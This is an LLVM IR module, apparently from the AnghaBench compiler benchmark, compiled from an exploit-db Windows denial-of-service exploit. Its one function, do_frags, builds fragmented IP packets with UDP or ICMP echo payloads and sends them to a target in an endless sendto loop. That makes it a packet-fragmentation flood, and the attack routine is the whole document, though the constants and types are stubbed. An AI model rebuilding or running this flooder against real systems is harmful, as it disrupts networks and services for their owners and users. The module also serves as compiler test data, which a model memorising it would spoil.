; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_214.c_do_frags.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_214.c_do_frags.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_14__ = type { i8, %struct.TYPE_13__, %struct.TYPE_10__ }
%struct.TYPE_13__ = type { %struct.TYPE_12__, %struct.TYPE_11__ }
%struct.TYPE_12__ = type { i64, i64, i32 }
%struct.TYPE_11__ = type { i8*, i8*, i8* }
%struct.TYPE_10__ = type { i32, i32, i32, i8*, i8*, i8*, i32, i8*, i64 }
%struct.sockaddr_in = type { i32, %struct.TYPE_9__, i32 }
%struct.TYPE_9__ = type { i8* }
%struct.sockaddr = type { i32 }

@AF_INET = common dso_local global i32 0, align 4
@iplen = common dso_local global i32 0, align 4
@udplen = common dso_local global i32 0, align 4
@icmplen = common dso_local global i32 0, align 4
@pkt = common dso_local global %struct.TYPE_14__ zeroinitializer, align 8
@IPPROTO_UDP = common dso_local global i32 0, align 4
@IPPROTO_ICMP = common dso_local global i32 0, align 4
@ICMP_ECHO = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @do_frags(i32 %0, i8* %1, i8* %2, i32 %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i64, align 8
  %12 = alloca %struct.sockaddr_in, align 8
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i8* %2, i8** %7, align 8
  store i32 %3, i32* %8, align 4
  %13 = load i32, i32* @AF_INET, align 4
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 2
  store i32 %13, i32* %14, align 8
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 0
  store i32 1235, i32* %15, align 8
  %16 = load i8*, i8** %7, align 8
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 1
  %18 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %17, i32 0, i32 0
  store i8* %16, i8** %18, align 8
  %19 = load i32, i32* %8, align 4
  %20 = icmp ne i32 %19, 0
  br i1 %20, label %21, label %26

21:                                               ; preds = %4
  %22 = load i32, i32* @iplen, align 4
  %23 = load i32, i32* @udplen, align 4
  %24 = add nsw i32 %22, %23
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %10, align 4
  br label %31

26:                                               ; preds = %4
  %27 = load i32, i32* @iplen, align 4
  %28 = load i32, i32* @icmplen, align 4
  %29 = add nsw i32 %27, %28
  %30 = add nsw i32 %29, 1
  store i32 %30, i32* %10, align 4
  br label %31

31:                                               ; preds = %26, %21
  %32 = load i32, i32* %10, align 4
  %33 = call i32 @memset(%struct.TYPE_14__* @pkt, i32 0, i32 %32)
  store i32 4, i32* getelementptr inbounds (%struct.TYPE_14__, %struct.TYPE_14__* @pkt, i32 0, i32 2, i32 0), align 8
  store i32 5, i32* getelementptr inbounds (%struct.TYPE_14__, %struct.TYPE_14__* @pkt, i32 0, i32 2, i32 1), align 4
  %34 = load i32, i32* @iplen, align 4
  %35 = load i32, i32* @icmplen, align 4
  %36 = add nsw i32 %34, %35
  %37 = call i8* @htons(i32 %36)
  %38 = getelementptr i8, i8* %37, i64 40
  %39 = ptrtoint i8* %38 to i64
  store i64 %39, i64* getelementptr inbounds (%struct.TYPE_14__, %struct.TYPE_14__* @pkt, i32 0, i32 2, i32 8), align 8
  %40 = call i8* @htons(i32 1109)
  store i8* %40, i8** getelementptr inbounds (%struct.TYPE_14__, %struct.TYPE_14__* @pkt, i32 0, i32 2, i32 7), align 8
  store i32 255, i32* getelementptr inbounds (%struct.TYPE_14__, %struct.TYPE_14__* @pkt, i32 0, i32 2, i32 2), align 8
  %41 = load i32, i32* %8, align 4
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %43, label %45

43:                                               ; preds = %31
  %44 = load i32, i32* @IPPROTO_UDP, align 4
  br label %47

45:                                               ; preds = %31
  %46 = load i32, i32* @IPPROTO_ICMP, align 4
  br label %47

47:                                               ; preds = %45, %43
  %48 = phi i32 [ %44, %43 ], [ %46, %45 ]
  store i32 %48, i32* getelementptr inbounds (%struct.TYPE_14__, %struct.TYPE_14__* @pkt, i32 0, i32 2, i32 6), align 8
  %49 = load i8*, i8** %6, align 8
  store i8* %49, i8** getelementptr inbounds (%struct.TYPE_14__, %struct.TYPE_14__* @pkt, i32 0, i32 2, i32 5), align 8
  %50 = load i8*, i8** %7, align 8
  store i8* %50, i8** getelementptr inbounds (%struct.TYPE_14__, %struct.TYPE_14__* @pkt, i32 0, i32 2, i32 4), align 8
  %51 = call i8* @htons(i32 8190)
  store i8* %51, i8** getelementptr inbounds (%struct.TYPE_14__, %struct.TYPE_14__* @pkt, i32 0, i32 2, i32 3), align 8
  %52 = load i32, i32* %8, align 4
  %53 = icmp ne i32 %52, 0
  br i1 %53, label %54, label %61

54:                                               ; preds = %47
  %55 = load i32, i32* %8, align 4
  %56 = or i32 %55, 1235
  %57 = call i8* @htons(i32 %56)
  store i8* %57, i8** getelementptr inbounds (%struct.TYPE_14__, %struct.TYPE_14__* @pkt, i32 0, i32 1, i32 1, i32 2), align 8
  %58 = load i32, i32* %8, align 4
  %59 = call i8* @htons(i32 %58)
  store i8* %59, i8** getelementptr inbounds (%struct.TYPE_14__, %struct.TYPE_14__* @pkt, i32 0, i32 1, i32 1, i32 1), align 8
  %60 = call i8* @htons(i32 9)
  store i8* %60, i8** getelementptr inbounds (%struct.TYPE_14__, %struct.TYPE_14__* @pkt, i32 0, i32 1, i32 1, i32 0), align 8
  store i8 97, i8* getelementptr inbounds (%struct.TYPE_14__, %struct.TYPE_14__* @pkt, i32 0, i32 0), align 8
  br label %63

61:                                               ; preds = %47
  %62 = load i32, i32* @ICMP_ECHO, align 4
  store i32 %62, i32* getelementptr inbounds (%struct.TYPE_14__, %struct.TYPE_14__* @pkt, i32 0, i32 1, i32 0, i32 2), align 8
  store i64 0, i64* getelementptr inbounds (%struct.TYPE_14__, %struct.TYPE_14__* @pkt, i32 0, i32 1, i32 0, i32 1), align 8
  store i64 0, i64* getelementptr inbounds (%struct.TYPE_14__, %struct.TYPE_14__* @pkt, i32 0, i32 1, i32 0, i32 0), align 8
  br label %63

63:                                               ; preds = %61, %54
  br label %64

64:                                               ; preds = %63, %64
  %65 = load i32, i32* %5, align 4
  %66 = load i32, i32* %10, align 4
  %67 = bitcast %struct.sockaddr_in* %12 to %struct.sockaddr*
  %68 = call i32 @sendto(i32 %65, %struct.TYPE_14__* @pkt, i32 %66, i32 0, %struct.sockaddr* %67, i32 4)
  store i32 %68, i32* %9, align 4
  br label %64
}

declare dso_local i32 @memset(%struct.TYPE_14__*, i32, i32) #1

declare dso_local i8* @htons(i32) #1

declare dso_local i32 @sendto(i32, %struct.TYPE_14__*, i32, i32, %struct.sockaddr*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
